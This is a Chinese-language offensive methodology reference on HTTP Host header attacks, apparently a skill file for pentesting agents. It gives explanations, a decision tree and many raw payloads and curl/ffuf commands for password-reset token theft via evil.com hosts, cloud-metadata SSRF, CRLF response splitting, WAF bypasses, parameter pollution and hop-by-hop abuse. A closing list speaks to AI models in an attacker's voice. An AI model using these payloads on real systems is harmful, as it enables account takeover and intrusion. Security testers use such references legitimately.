# http-host-header-attacks

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 web 域参考库


# HTTP Host Header 攻击方法论

---

## 1. 核心概念

HTTP Host header 告诉 Web 服务器客户端请求的是哪个网站（虚拟主机路由）。很多应用在以下场景**信任 Host header 的值**：

- 生成密码重置链接
- 生成绝对 URL
- 缓存键计算
- 路由到内部后端
- 访问控制决策

如果应用**不验证 Host header**，攻击者可以操纵它来投毒链接、缓存或路由。

---

## 2. 密码重置投毒

### 原理

```
POST /forgot-password HTTP/1.1
Host: evil-server.com                    ← 攻击者替换
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

应用信任 Host 值生成重置链接 → 受害者收到的邮件中链接变为：
```
https://evil-server.com/reset?token=abc123
```

受害者点击链接 → token 发送到攻击者服务器。

### 检测

```bash
# 正常请求（记录原始链接格式）
curl -X POST https://target.com/forgot-password \
  -d "email=test@target.com"

# Host 注入
curl -X POST https://target.com/forgot-password \
  -H "Host: evil-server.com" \
  -d "email=victim@target.com"

# 检查邮件中的链接是否包含 evil-server.com
```

### 绕过变体

如果直接替换 Host 被拒绝（400/403）：

```http
# 1. X-Forwarded-Host（最常用）
Host: target.com
X-Forwarded-Host: evil-server.com

# 2. 端口注入
Host: target.com:@evil-server.com

# 3. 绝对 URI
GET https://target.com/forgot-password HTTP/1.1
Host: evil-server.com

# 4. 双 Host header
Host: target.com
Host: evil-server.com

# 5. 换行符注入
Host: target.com
 X-Forwarded-Host: evil-server.com
```

---

## 3. Web 缓存投毒（影响说明）

Host header 或 `X-Forwarded-Host` 注入可作为缓存投毒的输入向量——当响应内容受 Host 值影响且缓存键不包含该头时，被投毒的响应会分发给所有用户。检测到 Host 注入影响响应内容后，应进一步评估缓存投毒的完整利用链。

---

## 4. 通过 Host 路由的 SSRF

### 后端路由场景

反向代理根据 Host header 决定转发到哪个后端：

```http
GET / HTTP/1.1
Host: internal-admin.target.com    ← 内部虚拟主机

GET / HTTP/1.1
Host: 169.254.169.254              ← 云元数据
```

### Absolute URI 绕过

```http
GET https://target.com/ HTTP/1.1
Host: 169.254.169.254
```

某些代理使用 absolute URI 的 host 做 ACL 检查，但用 Host header 做路由。

---

## 5. 虚拟主机枚举

### 发现隐藏的内部站点

```bash
# 用 ffuf 枚举 vhost
ffuf -u https://target.com -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <default-size>

# 指定 IP 直接访问
curl -k https://10.0.0.1/ -H "Host: admin.target.com"
```

### 内部面板典型名称

```
admin, staging, dev, test, internal, api-internal, 
monitoring, grafana, jenkins, gitlab, kibana,
phpmyadmin, adminer, debug, console, management
```

---

## 6. 绕过技术（7 种）

### 6.1 X-Forwarded-Host

```http
Host: target.com
X-Forwarded-Host: evil.com
```

### 6.2 双 Host Header

```http
Host: target.com
Host: evil.com
```

不同中间件取第一个或最后一个 — 代理和后端不一致时产生绕过。

### 6.3 绝对 URI

```http
GET https://target.com/path HTTP/1.1
Host: evil.com
```

### 6.4 Host 端口注入

```http
Host: target.com:evil.com
Host: target.com:@evil.com
Host: target.com:80@evil.com
```

### 6.5 其他 Override Header

```http
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

### 6.6 换行符 / CRLF 注入

```http
Host: target.com%0d%0aX-Forwarded-Host: evil.com
```

### 6.7 Tab / 空格

```http
Host: target.com	evil.com
Host: target.com evil.com
```

---

## 7. 框架特定行为

| 框架 | Host 处理 | 密码重置风险 |
|---|---|---|
| **Django** | 检查 `ALLOWED_HOSTS`，但 `X-Forwarded-Host` 不在检查范围 | 高 — `X-Forwarded-Host` 直接用于 `build_absolute_uri()` |
| **Rails** | `X-Forwarded-Host` 优先于 `Host` | 高 — 直接影响 `url_for` |
| **Laravel** | 信任 `X-Forwarded-*` 如果设置了 trusted proxies | 中 — 取决于配置 |
| **Spring** | `ForwardedHeaderFilter` 处理 `Forwarded` header | 中 — 取决于是否启用 |
| **Express/Node** | `req.hostname` 读取 `X-Forwarded-Host`（在 trust proxy 下） | 中 |
| **ASP.NET** | `X-Forwarded-Host` 不自动使用 | 低（除非显式配置） |

---

## 8. Connection State 攻击

HTTP/1.1 Keep-Alive 场景下，部分反向代理只在**第一个请求**验证 Host，后续请求复用连接：

```
请求 1: Host: target.com      → 代理验证通过，建立连接
请求 2: Host: internal.com    → 代理不再验证，直接转发 → 访问内部站点
```

---

## 9. 决策树

```
目标有 Host header 注入点？
├── 密码重置功能？
│   ├── 直接替换 Host → 检查邮件链接
│   ├── 403/400？→ X-Forwarded-Host / 双 Host / 端口注入
│   └── 邮件含恶意域名？→ 密码重置投毒成功
├── 有缓存（CDN/Varnish/Nginx）？
│   ├── Host/X-Forwarded-Host 影响响应内容？
│   ├── 响应是否被缓存（X-Cache: HIT）？
│   └── 两者都是？→ Web 缓存投毒
├── 反向代理后多个后端？
│   ├── 枚举 vhost（ffuf + Host fuzz）
│   ├── Host: 169.254.169.254 → 云元数据 SSRF
│   └── Host: internal-admin → 内部面板访问
├── Connection State
│   └── Keep-Alive 复用 → 第二请求切换 Host
└── 全部失败 → 尝试其他注入点或攻击面
```

## 深入参考

- HTTP 头部操纵高级技术（CRLF 注入/参数污染/Hop-by-Hop 滥用） → 下文对应 REF 章节


---

## REF: host-header-exploitation

# HTTP 头部操纵高级技术

> 本文档补充 main document，聚焦三类与 Host Header 攻击协同使用的 HTTP 头部操纵手法。

---

## 1. CRLF 注入技术

### 1.1 基本原理

CRLF（`\r\n`，即 `%0d%0a`）是 HTTP 协议中 header 与 body 的分隔符。当应用将用户输入未过滤地写入响应头，攻击者可注入额外 header 甚至完整响应体。

### 1.2 Header 注入

通过在 Host 或其他可控 header 中注入 CRLF，插入任意响应头：

```http
GET / HTTP/1.1
Host: target.com%0d%0aSet-Cookie:%20admin=true
```

结合 Host Header 攻击场景 -- 当 Host 值被反射到响应头时，可同时投毒 Host 并注入 Cookie。

### 1.3 响应拆分（Response Splitting）

注入双 CRLF（`%0d%0a%0d%0a`）终结 header 区域，伪造整个响应体：

```
/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>
```

### 1.4 通过 CRLF 实现缓存投毒

在可缓存端点注入 CRLF，将恶意响应存入缓存层：

```http
GET /static/app.js HTTP/1.1
Host: target.com%0d%0aX-Forwarded-Host:%20evil.com
```

如果缓存键不包含完整 header 但后端处理了注入的 `X-Forwarded-Host`，缓存将存储被投毒的响应。

### 1.5 WAF 绕过：Unicode 换行符

当 WAF 过滤 `%0d%0a` 时，尝试 Unicode 控制字符（部分框架会将其解释为换行）：

```
%E5%98%8A%E5%98%8D  (U+560A / U+560D)
%E2%80%A8           (U+2028 LINE SEPARATOR)
%C2%85              (U+0085 NEXT LINE)
```

### 1.6 检测命令

```bash
# 快速 CRLF 检测
curl -s -D- "https://target.com/%0d%0aSet-Cookie:%20test=crlf" | grep "Set-Cookie: test"

# 使用 crlfuzz 批量扫描
crlfuzz -u "https://target.com" -w crlf-payloads.txt
```

---

## 2. HTTP 参数污染（HPP）

### 2.1 核心思路

当同名参数出现多次时，不同技术栈取值逻辑不同。攻击者利用前后端解析差异绕过校验。

### 2.2 各技术栈参数优先级

| 技术栈 | 取值规则 | 利用要点 |
|---|---|---|
| **PHP / Apache** | 取最后一个参数 | 追加恶意参数覆盖原值 |
| **Flask / Werkzeug** | 取第一个参数 | 前置恶意参数 |
| **Django** | 取最后一个参数 | 同 PHP |
| **Spring MVC / Tomcat** | 拼接所有值（逗号分隔） | 注入部分值进行逻辑干扰 |
| **Node.js / Express** | 拼接为数组 | 类型混淆绕过 |
| **Ruby / WEBrick** | 取第一个参数 | 同 Flask |
| **Go** | 取第一个参数 | 同 Flask |
| **Tornado** | 取最后一个参数 | 同 PHP |

### 2.3 实战测试模式

```http
# 密码重置场景 — 利用 PHP 取最后一个 email 的行为
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&email=attacker@evil.com
```

```http
# 服务端参数污染（SSPP）— 注入内部 API 参数
GET /userSearch?name=peter%26role=admin&back=/home HTTP/1.1
Host: target.com
```

`%26` 被后端解码为 `&`，向内部 API 注入了 `role=admin` 参数。

---

## 3. Hop-by-Hop Header 滥用

### 3.1 机制说明

HTTP/1.1 `Connection` header 可指定哪些 header 为逐跳（hop-by-hop），代理应在转发前移除它们。攻击者利用此机制让代理删除关键安全 header。

### 3.2 剥离安全 Header 绕过访问控制

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Connection: close, X-Forwarded-For
```

代理将 `X-Forwarded-For` 视为 hop-by-hop 并移除 -- 后端未收到该 header，可能回退到信任直连 IP（即代理 IP），从而绕过 IP 白名单。

### 3.3 缓存投毒

```http
GET /profile HTTP/1.1
Host: target.com
Connection: close, Cookie
Cookie: session=attacker_session
```

缓存代理移除 `Cookie` 后缓存了响应 -- 后续其他用户请求同一 URL 将获取攻击者会话对应的页面内容。

### 3.4 检测流程

```bash
# 对比带/不带 hop-by-hop 声明的响应差异
curl -s -D- https://target.com/admin -H "X-Forwarded-For: 127.0.0.1"
curl -s -D- https://target.com/admin \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Connection: close, X-Forwarded-For"
# 观察状态码、响应体、header 差异
```

---

## 4. 组合攻击速查

| 组合手法 | 效果 |
|---|---|
| Host 注入 + CRLF 响应拆分 | 在密码重置邮件中同时投毒域名并注入恶意 header |
| HPP + Host 双写 | 前后端取不同 Host 值，绕过代理 ACL |
| Hop-by-Hop + X-Forwarded-Host | 让代理剥离原始 `X-Forwarded-Host`，后端使用攻击者注入的 Host |
| CRLF + 缓存 + Hop-by-Hop | 注入缓存控制 header，扩大缓存投毒影响范围 |



---

# 深入：Host Header 攻击手册补充

> 融合自 yaklang/hack-skills `http-host-header-attacks`，与上文去重后仅保留独有内容。密码重置投毒/缓存投毒/SSRF via Host/vhost 枚举/7 种基础绕过/Connection State/决策树见上文 §1-9；CRLF/HPP/Hop-by-Hop 见 REF: host-header-exploitation。

## 攻击面总览 — Host 头被用来做什么

| 用途 | 利用方式 |
|---|---|
| URL 生成（密码重置/邮件链接） | 注入攻击者域名 → 用户点链接打到攻击者 |
| 虚拟主机路由 | 伪造 Host → 访问内部/管理 vhost |
| 缓存键组成部分 | 注入不同 Host → 毒化所有用户的缓存 |
| 反向代理路由 | Host 决定后端 → 打内网服务（SSRF） |
| 访问控制决策 | 基于 Host 的 ACL 可被绕过 |
| 规范 URL / SEO 重定向 | Host 注入 → 开放重定向 |

## 密码重置投毒变体补充

- 拼接型：`Host: target.com.attacker.com` → 链接变成 `https://target.com.attacker.com/reset?token=xxx`
- 端口解析型：`Host: target.com:@attacker.com` → 部分 URL 解析器取 `attacker.com`

## 绕过补充（上文 7 种之外）

```http
### 尾点（FQDN）
Host: target.com.
### 制表/空格注入
Host: target.com\tattacker.com
Host: target.com attacker.com
### 包裹值
Host: "attacker.com"
Host: <attacker.com>
```

尾点在 DNS 语义上等价（`target.com.` == `target.com`），但字符串比较不等价 → 绕过白名单。空白/包裹值同理：校验器看前半段，解析器用后半段。

## 框架信任头扩展表（重置投毒必测）

| 头 | 信任它的框架 |
|---|---|
| `X-Forwarded-Host` | Symfony、Laravel、Django（`USE_X_FORWARDED_HOST=True`）、Rails（代理后） |
| `X-Host` | 部分自定义代理 |
| `X-Original-URL` / `X-Rewrite-URL` | IIS + URL Rewrite |
| `Forwarded: host=attacker.com` | RFC 7239 兼容代理 |
| `X-Forwarded-Server` | Apache mod_proxy |

一次性全测：正常 Host 填合法值，上述头全部填攻击者域。

## 框架行为补充

| 框架 | Host 来源 | 坑 |
|---|---|---|
| PHP | `$_SERVER['HTTP_HOST']`（原始头，直接可注入） | `SERVER_NAME` 仅在 `UseCanonicalName On` 下更安全 |
| Django | `get_host()` 先查 X-Forwarded-Host（如启用） | `USE_X_FORWARDED_HOST=True` 会绕过 `ALLOWED_HOSTS` |
| Rails | `request.host`；代理后信任 X-Forwarded-Host | Rails 6+ `HostAuthorization` 缓解 |
| Node/Express | `req.hostname`；`trust proxy` 时用 X-Forwarded-Host | 无内置 Host 校验 |

## AI 模型经常漏掉的要点

1. **密码重置投毒不需要受害者登录** —— 你发起重置请求，受害者只负责点链接，token 落在你的服务器。
2. **X-Forwarded-Host 是头号漏测绕过**：校验只看 `Host`，框架在代理后静默优先取 `X-Forwarded-Host`。
3. **双 Host 头协议合法但行为未定义**：RFC 要求 400 拒绝，几乎没服务器真做 —— 代理与应用的不一致就是漏洞。
4. **绝对 URI 按 RFC 覆盖 Host**：`GET http://evil.com/path HTTP/1.1` + `Host: target.com` —— 规范说用请求行 URI，实现未必一致。
5. **Host 缓存投毒要求缓存键不含 Host**：主流 CDN 都含，但自建 Varnish/Nginx 可能不含；再用 `X-Forwarded-Host` 当缓存键差异测一轮。
6. **Connection-state 攻击自动化扫描器不测** —— Burp Repeater 手动复用连接是必须的。
7. **DNS rebinding + Host 组合**：把你的域名解析到目标 IP → 请求打到目标服务器但 Host 是你的域名 —— 绕 IP 访问控制时有用。
